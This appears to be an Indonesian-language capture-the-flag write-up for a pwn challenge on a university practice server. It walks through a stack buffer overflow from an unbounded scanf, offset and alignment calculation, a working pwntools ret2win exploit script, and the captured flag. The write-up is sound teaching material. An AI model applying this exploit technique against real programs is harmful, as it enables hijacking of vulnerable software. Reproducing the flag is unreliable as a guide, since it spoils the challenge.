https://gemini.google.com/share/df4d21d88966
# WriteUp: Ret to win!

## Informasi Tantangan

* **Nama Challenge:** Ret to win!
* **Kategori:** Pwn
* **Poin:** 500
* **Deskripsi:** Tantangan ini mengharuskan kita mengeksploitasi binary yang berjalan pada layanan TCP remote untuk mendapatkan flag.
* **Koneksi:** `nc practice-digitalsecuritylab.di.unipi.it 10003`

## 1. Reconnaissance (Pengumpulan Informasi)

Langkah pertama adalah menganalisis file binary `chall` yang diberikan untuk memahami arsitektur dan proteksi keamanannya.

### Informasi File

Menggunakan perintah `file` untuk melihat jenis binary:

```bash
$ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3d1a87e9f38678f9cdcf29f04c583806d5eafe20, for GNU/Linux 4.4.0, not stripped

```

Binary adalah ELF 64-bit LSB executable.

### Proteksi Keamanan

Menggunakan `checksec` untuk melihat mitigasi yang aktif:

```bash
$ checksec --file=chall
[*] '/home/wanzkey/Digital Security Lab CTF/Pwn/Ret to win!/chall'
    Arch:        amd64-64-little
    RELRO:       Partial RELRO
    Stack:       No canary found
    NX:          NX enabled
    PIE:         No PIE (0x400000)
    Stripped:    No

```

* **No Canary:** Memungkinkan serangan Buffer Overflow.
* **No PIE:** Alamat memori fungsi statis (tidak berubah).
* **NX Enabled:** Stack tidak dapat dieksekusi (perlu menggunakan ROP/Ret2Win).

### Analisis Logika Program

Menjalankan program secara lokal dan menggunakan `ltrace` untuk melihat library calls:

```bash
$ ./chall
Enter your name: test
Hello test!

$ ltrace ./chall
...
printf("Enter your name: "...)
__isoc99_scanf(0x402037, 0x7ffc63f6b000, 0, 0test) = 1
printf("Hello %s!\n", "test"...)
...

```

### Decompile (IDA Pro)

Hasil decompile menunjukkan kode berikut:

**Fungsi `main`:**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char v4[32]; // [rsp+0h] [rbp-20h] BYREF

  setvbuf(_bss_start, 0LL, 2, 0LL);
  setbuf(stdin, 0LL);
  printf("Enter your name: ");
  __isoc99_scanf("%s", v4);
  printf("Hello %s!\n", v4);
  return 0;
}

```

**Fungsi `print_flag` (Target):**

```c
int print_flag()
{
  char s[72]; 
  FILE *stream; 

  stream = fopen("flag.txt", "r");
  if ( !stream )
    return puts("Flag file is missing.");
  fgets(s, 64, stream);
  puts(s);
  return fclose(stream);
}

```

## 2. Analisis Vulnerability

Vulnerability terletak pada fungsi `main`:

1. Variabel `v4` dialokasikan sebesar **32 bytes** (`[rbp-20h]`).
2. Fungsi `scanf("%s", v4)` tidak membatasi jumlah karakter input.
3. Hal ini memungkinkan kita menulis lebih dari 32 byte, menimpa *Saved RBP*, dan akhirnya menimpa *Return Address*.

## 3. Strategi Eksploitasi

Tujuan kita adalah melakukan teknik **Ret2Win**: membelokkan alur eksekusi agar program menjalankan fungsi `print_flag` setelah `main` selesai.

### Perhitungan Offset

Berdasarkan stack layout x64:

* Buffer (`v4`): 32 bytes
* Saved RBP: 8 bytes
* Return Address: Setelah 40 bytes (32 + 8).

**Offset:** 40 bytes.

### Stack Alignment (Penting)

Pada arsitektur 64-bit (Ubuntu/GLIBC modern), stack harus **16-byte aligned** sebelum memanggil instruksi `call` (seperti yang dilakukan di dalam `print_flag` saat memanggil `fopen` atau `puts`). Jika stack pointer tidak kelipatan 16, program akan crash dengan error `SEGFAULT` pada instruksi `movaps`.

Untuk memperbaikinya, kita menambahkan gadget `ret` (return kosong) sebelum melompat ke `print_flag`. Gadget ini hanya melakukan `pop rip`, menggeser stack 8 byte sehingga kembali align.

**Payload Structure:**
`Padding (40 bytes)` + `Gadget RET` + `Address of print_flag`

## 4. Exploitation Script

Berikut adalah script `solver.py` yang digunakan:

```python
from pwn import *

# Konfigurasi binary
exe = './chall'
elf = ELF(exe)
context.binary = exe

# Koneksi ke server
io = remote('practice-digitalsecuritylab.di.unipi.it', 10003)

# 1. Menentukan Offset
offset = 40

# 2. Mencari Gadget & Alamat Target
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0] # Gadget untuk Stack Alignment
print_flag_addr = elf.symbols['print_flag']

log.info(f"Offset: {offset}")
log.info(f"Ret Gadget: {hex(ret_gadget)}")
log.info(f"Print Flag Address: {hex(print_flag_addr)}")

# 3. Menyusun Payload
payload = flat({
    offset: [
        ret_gadget,      # Stack alignment
        print_flag_addr  # Target function
    ]
})

# 4. Mengirim Payload
io.recvuntil(b'Enter your name: ')
io.sendline(payload)

# 5. Mendapatkan Flag
io.interactive()

```

## 5. Hasil Eksekusi (Flag)

Menjalankan script exploit di terminal dan berhasil mendapatkan flag dari server remote:

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Digital Security Lab CTF/Pwn/Ret to win!]
└─$ python3 solver.py
[*] '/home/wanzkey/Digital Security Lab CTF/Pwn/Ret to win!/chall'
    Arch:        amd64-64-little
    RELRO:       Partial RELRO
    Stack:       No canary found
    NX:          NX enabled
    PIE:         No PIE (0x400000)
    Stripped:    No
[+] Opening connection to practice-digitalsecuritylab.di.unipi.it on port 10003: Done
[*] Loading gadgets for '/home/wanzkey/Digital Security Lab CTF/Pwn/Ret to win!/chall'
[*] Offset: 40
[*] Ret Gadget: 0x40101a
[*] Print Flag Address: 0x401196
[*] Switching to interactive mode
Hello aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa\x1a\x10@!
flag{r3t_t0_win_m0re_lik3_r3t_to_flag!}
[*] Got EOF while reading in interactive
$

```

**Flag:** `flag{r3t_t0_win_m0re_lik3_r3t_to_flag!}`
